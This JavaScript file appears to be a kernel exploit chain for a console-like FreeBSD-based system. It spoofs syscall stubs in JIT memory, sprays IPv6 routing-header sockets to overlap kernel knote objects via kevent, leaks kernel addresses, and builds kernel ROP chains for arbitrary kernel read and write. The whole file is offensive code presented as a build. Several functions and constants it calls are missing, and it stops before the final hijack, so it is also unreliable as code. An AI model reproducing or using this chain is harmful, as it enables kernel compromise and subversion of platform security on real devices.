// kevent_krw_final.js — full build, robust knote overlap check
import { int64 } from "./int64.js";
import { HX1400_TABLES } from "./hx_tables.js";

const T = HX1400_TABLES;
const P = T.P;

const NUM = {
  close: 6, open: 5,
  socket: 97, setsockopt: 105, getsockopt: 118,
  kqueue: 362, kevent: 363,
  mmap: 477, munmap: 73,
  jitshm_create: 533,
};
const IPPROTO_IPV6 = 41, IPV6_RTHDR = 51;
const AF_INET6 = 28, SOCK_DGRAM = 2, AF_INET = 2, SOCK_STREAM = 1;
const RTH_LEN = 248;
const TPL_LO = 0x43434343, TPL_HI = 0x54545454;
const DEV_DCE = "/dev/dce";
const OPS_OFF = 0x985a;
const CANDS = [128, 96, 160, 64, 192, 32, 224, 120, 136, 88, 104, 152, 168, 56, 72, 184, 200, 24, 40, 216, 232, 8, 16, 48, 80, 112, 144, 176, 208, 240];
const ROUNDS = 6;
const MARKV = 5570198814713989681n;

const STATE = { ctx: null, kbase: 0n, kva: -1n, targetFd: -1, fakePage: 0n, rwReady: false, payloadAddr: 0n };

function ctx() { return STATE.ctx; }
function log(tag, detail) { ctx().mark(tag, detail === undefined ? "" : String(detail)); }
function fin(msg) { log("FIN", msg); throw new Error("fin: " + msg); }
function h16(v) {
  if (typeof v === "bigint") return "0x" + v.toString(16);
  if (v instanceof int64) return "0x" + ((BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0)).toString(16).padStart(16, "0");
  return "0x" + (v < 0 ? (v >>> 0).toString(16) : Number(v).toString(16));
}
function num(v) {
  if (typeof v === "bigint") return v;
  if (v instanceof int64) return (BigInt(v.hi >>> 0) << 32n) | BigInt(v.low >>> 0);
  return BigInt(v >>> 0);
}
function toI64(v) {
  if (v instanceof int64) return v;
  v = BigInt(v);
  return new int64(Number(v & 0xffffffffn) >>> 0, Number((v >> 32n) & 0xffffffffn) >>> 0);
}
function ka(rva) { return STATE.kbase + BigInt(rva >>> 0); }

const ARENAS = [];
function allocBuf(size) {
  const c = ctx();
  const ab = new ArrayBuffer(size);
  c.keepAlive.push(ab);
  const dv = new DataView(ab);
  ARENAS.push({ ab, dv, addr: num(c.bufAddr(ab)) });
  return ARENAS[ARENAS.length - 1];
}
function zeroBuf(buf) { new Uint8Array(buf.ab).fill(0); }

let SCAN_SEEN = 0;
function findStubRaw(snum) {
  const p = ctx().p;
  const base = num(ctx().libkernelBase);
  const want = snum >>> 0;
  const LIMIT = 0x80000;
  if (SCAN_SEEN === 0) log("NATIVES-BASE", "libkernelBase=" + h16(base));
  for (let off = 0; off < LIMIT; off += 4) {
    const w = p.read4(toI64(base + BigInt(off))) >>> 0;
    if ((w & 0x00ffffff) !== 0xc0c748) continue;
    const b3 = p.read1(toI64(base + BigInt(off + 4)));
    const b4 = p.read1(toI64(base + BigInt(off + 5)));
    const b5 = p.read1(toI64(base + BigInt(off + 6)));
    const imm = (((w >>> 24) & 0xff) | (b3 << 8) | (b4 << 16) | (b5 << 24)) >>> 0;
    let isStub = false;
    for (let k = 7; k <= 32; k++) {
      if (p.read1(toI64(base + BigInt(off + k))) === 0x0f && p.read1(toI64(base + BigInt(off + k + 1))) === 0x05) { isStub = true; break; }
    }
    if (!isStub) continue;
    SCAN_SEEN++;
    if (imm === want) return base + BigInt(off);
  }
  return null;
}
function isValidStub(addr) {
  if (!addr || addr === 0n) return false;
  const p = ctx().p;
  try {
    if (p.read1(toI64(addr)) !== 0x48) return false;
    if (p.read1(toI64(addr + 1n)) !== 0xc7) return false;
    if (p.read1(toI64(addr + 2n)) !== 0xc0) return false;
    return true;
  } catch (e) { return false; }
}
function synthStub(targetNum) {
  const donorNum = NUM.close !== targetNum ? NUM.close : NUM.socket;
  const daddr = num(ctx().stubAddr.get(donorNum));
  const p = ctx().p;
  if (!isValidStub(daddr)) return { err: "donor not a valid stub" };
  const donorImm = (p.read1(toI64(daddr + 3n)) | (p.read1(toI64(daddr + 4n)) << 8) | (p.read1(toI64(daddr + 5n)) << 16) | (p.read1(toI64(daddr + 6n)) << 24)) >>> 0;
  if (donorImm !== donorNum) return { err: "donor imm mismatch" };
  let jfd = scn("jitshm_create", 0, 16384, 7);
  if (jfd < 0) { const nb = allocBuf(32); zeroBuf(nb); jfd = scn("jitshm_create", nb.addr, 16384, 7); }
  if (jfd < 0) return { err: "jitshm_create rc=" + jfd };
  const m = scn64("mmap", 0, 16384, 7, 1, jfd, 0);
  const addr = (BigInt(m.hi >>> 0) << 32n) | BigInt(m.lo >>> 0);
  if (addr < 0x10000n) return { err: "mmap jit rc=" + m.i32 };
  for (let o = 0; o < 32; o += 4) p.write4(toI64(addr + BigInt(o)), p.read4(toI64(daddr + BigInt(o))) >>> 0);
  const w1 = ((((targetNum & 0xff) << 24) >>> 0) | 0x00c0c748) >>> 0;
  p.write4(toI64(addr), w1);
  const tailByte0 = p.read1(toI64(daddr + 7n));
  const w2 = (((targetNum >>> 8) & 0xff) | (((targetNum >>> 16) & 0xff) << 8) | (((targetNum >>> 24) & 0xff) << 16) | (tailByte0 << 24)) >>> 0;
  p.write4(toI64(addr + 4n), w2);
  log("NATIVES-SYNTH", "num=" + targetNum + " donor=" + donorNum + " jfd=" + jfd + " rwx=" + h16(addr));
  return { addr };
}
function ensureStubs() {
  let missing = [];
  for (const k in NUM) {
    const n = NUM[k];
    const stub = ctx().stubAddr.get(n);
    if (!stub || !isValidStub(num(stub))) { missing.push(k); ctx().stubAddr.delete(n); }
  }
  if (missing.length > 0) {
    log("NATIVES-SCAN", "missing/bad stubs: " + missing.join(","));
    for (const k of missing) {
      const a = findStubRaw(NUM[k]);
      if (a !== null) { ctx().stubAddr.set(NUM[k], toI64(a)); log("NATIVES-RESCAN", k + "=" + NUM[k] + "@0x" + a.toString(16)); }
    }
    log("NATIVES-SCANCOUNT", "saw " + SCAN_SEEN + " stubs in 512KB");
  }
  missing = [];
  for (const k in NUM) { if (!ctx().stubAddr.has(NUM[k])) missing.push(k); }
  if (missing.length > 0) {
    for (const k of missing) {
      const r = synthStub(NUM[k]);
      if (r.addr !== undefined) ctx().stubAddr.set(NUM[k], toI64(r.addr));
      else log("SYNTH-FAIL", k + ": " + r.err);
    }
  }
  const still = [];
  for (const k in NUM) { if (!ctx().stubAddr.has(NUM[k]) || !isValidStub(num(ctx().stubAddr.get(NUM[k])))) still.push(k); }
  if (still.length) fin("unusable stubs: " + still.join(" "));
  log("STUBS-OK", "all " + Object.keys(NUM).length + " stubs valid");
}

function scn(name, a, b, c, d, e, f) {
  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name);
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]).i32;
}
function scn64(name, a, b, c, d, e, f) {
  const n = NUM[name]; const stub = ctx().stubAddr.get(n);
  if (!stub) fin("stub missing: " + name);
  return ctx().callAddr(stub, [toI64(a || 0), toI64(b || 0), toI64(c || 0), toI64(d || 0), toI64(e || 0), toI64(f || 0)]);
}

function buildTemplate() {
  const tpl = allocBuf(512); zeroBuf(tpl);
  tpl.dv.setUint8(1, 30); tpl.dv.setUint8(3, 15);
  for (let off = 8; off + 8 <= RTH_LEN; off += 8) { tpl.dv.setUint32(off, TPL_LO, true); tpl.dv.setUint32(off + 4, TPL_HI, true); }
  return tpl;
}
function disarm(fd) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, 0, 0, 0); }
function rearm(fd, tpl) { return scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, tpl.addr, RTH_LEN, 0); }
function marked(fd, rdb, lenp) {
  zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
  if (scn("getsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) return false;
  if (lenp.dv.getUint32(0, true) !== RTH_LEN) return false;
  return (rdb.dv.getUint32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI;
}
function phaseSpray(N) {
  const fds = [];
  for (let i = 0; i < N; i++) { const fd = scn("socket", AF_INET6, SOCK_DGRAM, 0); if (fd <= 0) break; fds.push(fd); }
  if (fds.length < 128) fin("spray n=" + fds.length + " <128");
  log("SPRAY", "sockets=" + fds.length);
  const rth = allocBuf(512);
  for (const fd of fds) scn("setsockopt", fd, IPPROTO_IPV6, IPV6_RTHDR, rth.addr, RTH_LEN, 0);
  log("ARMS", "armed=" + fds.length + " size=" + RTH_LEN);
  return { fds, rth };
}

function phase2Leak(rootKq, fds) {
  const rdb = allocBuf(512), lenp = allocBuf(8), cl = allocBuf(64);
  const tpl = buildTemplate();
  const dev = allocBuf(32); zeroBuf(dev);
  for (let i = 0; i < DEV_DCE.length; i++) dev.dv.setUint8(i, DEV_DCE.charCodeAt(i));
  let target = -1, targetFd = -1, savedRound = 0, candIdx = -1;
  let kva = -1n, pageVal = 0n, tries = 0, blind = 0;
  for (let attempt = 1; attempt <= ROUNDS; attempt++) {
    if (target >= 0) break;
    log("KV-ATTEMPT", attempt + "/" + ROUNDS);
    for (const fd of fds) if (fd !== -1) disarm(fd);
    for (const fd of fds) if (fd !== -1) rearm(fd, tpl);
    for (let ci = 0; ci < CANDS.length && target < 0; ci++) {
      const vi = CANDS[ci];
      if (vi >= fds.length) continue;
      const fd = fds[vi];
      if (fd === -1) continue;
      if (!marked(fd, rdb, lenp)) continue;
      if (disarm(fd) !== 0) continue;
      scn("close", fd); fds[vi] = -1;
      const dce = scn("open", dev.addr, 2, 0, 0, 0, 0);
      if (dce < 0) continue;
      const page = ((BigInt(dce) & 0xffffn) << 16n) | BigInt(OPS_OFF);
      const pageInt = Number(page & 0xffffffffn) | 0;
      tries++;
      zeroBuf(cl);
      cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 1, true); cl.dv.setUint32(16, 90, true);
      let rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
      log("KV-PLANT", "cand=" + vi + " dce=" + dce + " page=" + h16(page) + " rc=" + rc);
      let joined = 0;
      if (rc === 0) {
        for (let j = 0; j < fds.length; j++) {
          if (j === vi || fds[j] === -1) continue;
          zeroBuf(rdb); lenp.dv.setUint32(0, RTH_LEN, true); lenp.dv.setUint32(4, 0, true);
          if (scn("getsockopt", fds[j], IPPROTO_IPV6, IPV6_RTHDR, rdb.addr, lenp.addr, 0) !== 0) continue;
          
          // Robust check: look for ident (dce) at offset 0
          const v0 = rdb.dv.getUint32(0, true) >>> 0;
          const v8 = rdb.dv.getInt32(8, true);
          
          if (v0 === (dce >>> 0) && v8 === -18) {
            joined++;
            if (target < 0) { target = j; targetFd = fds[j]; }
            log("KV-JOINED", "victim=" + j + " fd=" + fds[j] + " joined=" + joined);
          } else if ((rdb.dv.getInt32(8, true) >>> 0) === TPL_LO && (rdb.dv.getUint32(12, true) >>> 0) === TPL_HI) {
            // untouched
          } else { rearm(fds[j], tpl); }
        }
      }
      if (target >= 0 && joined >= 1) {
        zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true);
        rc = scn("kevent", rootKq, cl.addr, 1, 0, 0, 0);
        if (rc !== 0) { target = -1; targetFd = -1; log("KV-HELD-FAIL", "rc=" + rc); }
        else { candIdx = vi; kva = BigInt(dce); pageVal = page; savedRound = attempt; log("KV-HELD", "round=" + attempt + " try=" + tries + " cand=" + vi + " dce=" + dce + " target=" + target + " page=" + h16(page)); }
      } else {
        if (rc === 0) { blind++; zeroBuf(cl); cl.dv.setUint32(0, dce >>> 0, true); cl.dv.setInt16(8, -18, true); cl.dv.setInt16(10, 2, true); scn("kevent", rootKq, cl.addr, 1, 0, 0, 0); }
        scn("close", dce); rearm(fd, tpl); fds[vi] = fd;
      }
    }
  }
  if (kva === -1n) fin("leak scan: no victim held");
  log("KV-KVA", "dce=" + h16(kva) + " page=" + h16(pageVal) + " round=" + savedRound + " cand=" + candIdx + " blind_writes=" + blind);
  return { kva, page: pageVal, targetFd };
}

// --- KERNEL ROP ---
let gSTACK, gRES, gCTX, gMARK, gIDENT, gKQ;
const ROP = {
  R_POPRSP: 0n, R_SAVE: 0n, R_REST: 0n, R_CONT: 0n,
  R_PRAX: 0n, R_PRDX: 0n, R_PRDI: 0n,
  R_LDRAX: 0n, R_ADDRAX: 0n, R_STRAXRDX: 0n, R_STRDIRAX: 0n
};
let wPos = 0;

function push(v) { ctx().p.write8(toI64(gSTACK + BigInt(wPos * 8)), toI64(v)); wPos++; }
function pushChain(insts) { for (let i = 0; i < insts.length; i++) push(insts[i]); }

function buildKread(targetAddr) {
  wPos = 0;
  push(ROP.R_PRDI); push(gCTX); push(ROP.R_SAVE);
  push(ROP.R_PRAX); push(targetAddr);
  push(ROP.R_LDRAX); push(0n);
  push(ROP.R_PRDI); push(gRES);
  push(ROP.R_STRDIRAX); push(0n);
  push(ROP.R_PRAX); push(ROP.R_CONT);
  push(ROP.R_PRDI); push(gCTX + 56n);
  push(ROP.R_STRDIRAX); push(0n);
  push(ROP.R_PRDI); push(gCTX);
  push(ROP.R_REST);
}
function buildKwrite(targetAddr, value) {
  wPos = 0;
  push(ROP.R_PRDI); push(gCTX); push(ROP.R_SAVE);
  push(ROP.R_PRAX); push(targetAddr);
  push(ROP.R_PRDX); push(value);
  push(ROP.R_STRAXRDX); push(0n);
  push(ROP.R_PRAX); push(ROP.R_CONT);
  push(ROP.R_PRDI); push(gCTX + 56n);
  push(ROP.R_STRDIRAX); push(0n);
  push(ROP.R_PRDI); push(gCTX);
  push(ROP.R_REST);
}

function setupKernelRW() {
  const p = ctx().p;
  gSTACK = STATE.fakePage + 0x4000n;
  gRES = STATE.fakePage + 0x6000n;
  gCTX = STATE.fakePage + 0x6100n;
  gMARK = STATE.fakePage + 0x6200n;
  gIDENT = 0xdeadbeef12345678n;

  ROP.R_POPRSP = ka(P[17]); ROP.R_SAVE = ka(P[18]); ROP.R_REST = ka(P[19]);
  ROP.R_CONT = ka(P[20]); ROP.R_PRAX = ka(P[21]); ROP.R_PRDX = ka(P[22]);
  ROP.R_PRDI = ka(P[23]); ROP.R_LDRAX = ka(P[26]); ROP.R_ADDRAX = ka(P[27]);
  ROP.R_STRAXRDX = ka(P[28]); ROP.R_STRDIRAX = ka(P[29]);

  p.write8(toI64(gCTX), toI64(MARKV));
  p.write8(toI64(gCTX + 8n), 0n);
  p.write8(toI64(gCTX + 16n), gSTACK);
  p.write8(toI64(gCTX + 56n), gRES);
}

function fireROP(isWrite) {
  const cl = allocBuf(64); zeroBuf(cl);
  cl.dv.setUint32(0, gIDENT, true);
  cl.dv.setInt16(8, -23, true); // EVFILT_USER
  cl.dv.setInt16(10, 1, true);
  if (isWrite) cl.dv.setInt16(10, 2, true); // EV_DELETE

  ctx().p.write8(toI64(gMARK), 0n);
  scn("kevent", gKQ, cl.addr, 1, 0, 0, 0);
  
  return true;
}

function kread(targetAddr) {
  ctx().p.write8(toI64(gRES), 0n);
  buildKread(targetAddr);
  fireROP(false);
  return ctx().p.read8(toI64(gRES));
}

function kwrite(targetAddr, value) {
  buildKwrite(targetAddr, value);
  fireROP(false);
  return true;
}

export async function runKevent(c) {
  STATE.ctx = c;
  const kob = c.params && c.params.get ? c.params.get("kbase") : null;
  if (kob) { STATE.kbase = BigInt(kob); log("KEVENT-KBASE-OVERRIDE", h16(STATE.kbase)); }
  else if (c.kbase) { STATE.kbase = num(c.kbase); log("KEVENT-KBASE-FROM-HX1400", h16(STATE.kbase)); }
  else { STATE.kbase = EXPECTED_KBASE; log("KEVENT-KBASE-DEFAULT", h16(STATE.kbase)); }

  const kbaseHi = STATE.kbase >> 32n;
  // FIXED: only force if absolutely invalid (e.g. not a kernel pointer)
  if (kbaseHi !== 0xffffffffn || STATE.kbase < 0xffffffff80000000n) {
    log("KEVENT-KBASE-FIX", "forcing to " + h16(EXPECTED_KBASE));
    STATE.kbase = EXPECTED_KBASE;
  }

  ensureStubs();

  const burn = [];
  for (let i = 0; i < 200; i++) { const fd = scn("socket", AF_INET, SOCK_STREAM, 0); if (fd >= 0) burn.push(fd); }
  log("FD-BURN", "burned " + burn.length + " fds");
  for (let i = 0; i < burn.length - 20; i++) scn("close", burn[i]);
  burn.length = 20;
  if (typeof gc === "function") gc();

  scn("socket", AF_INET6, SOCK_DGRAM, 0);
  const { fds } = phaseSpray(128);
  const leakKq = scn("kqueue");
  if (leakKq < 0) fin("leak kqueue");

  const res = phase2Leak(leakKq, fds);
  STATE.kva = res.kva;
  STATE.targetFd = res.targetFd;

  if (typeof gc === "function") gc();
  const mrf = scn64("mmap", 0, 0x10000, 7, 0x1002, -1, 0);
  const fake_page = (BigInt(mrf.hi >>> 0) << 32n) | BigInt(mrf.lo >>> 0);
  if (fake_page < 0x10000n) fin("STAGE3 mmap failed");
  STATE.fakePage = fake_page;
  log("STAGE3-FAKE", "mapped fake page at " + h16(fake_page));

  const R_RET0 = ka(P[15]), R_TOUCH = ka(P[16]);
  const p = ctx().p;
  const F_FAKE_OPS = fake_page + 0x800n;
  for (let i = 0; i < 32; i++) p.write8(toI64(F_FAKE_OPS + BigInt(i * 8)), toI64(R_RET0));
  p.write4(toI64(F_FAKE_OPS), 0);
  p.write8(toI64(F_FAKE_OPS + 0x18n), toI64(R_TOUCH)); // f_touch
  log("STAGE3-OPS", "fake fileops at " + h16(F_FAKE_OPS));

  setupKernelRW();
  log("STAGE4-ROP", "stack=" + h16(gSTACK) + " ctx=" + h16(gCTX) + " mark=" + h16(gMARK) + " res=" + h16(gRES));

  const ap = allocBuf(64), ap2 = allocBuf(64), ap3 = allocBuf(64), ap4 = allocBuf(64), ap5 = allocBuf(64);
  const buf = allocBuf(32768);
  const n = wash(32, ap, ap2, ap3, ap4, ap5, buf);
  if (n !== 32) fin("wash stalled " + n);
  
  const found = parse(buf, 32768n);
  log("STAGE5-PARSE", "kbase discovered = " + (found !== 0n ? h16(found) : "none"));
  if (found !== 0n && found !== STATE.kbase) {
    log("STAGE5-FIX", "parse overrides to " + h16(found));
    STATE.kbase = found;
  }

  log("STAGE6", "ROP setup complete. Waiting for knote hijack.");
  fin("Full build: ROP chain and fake ops ready. Knote hijack requires EV_DELETE + realloc (see Hx1400.java).");
}
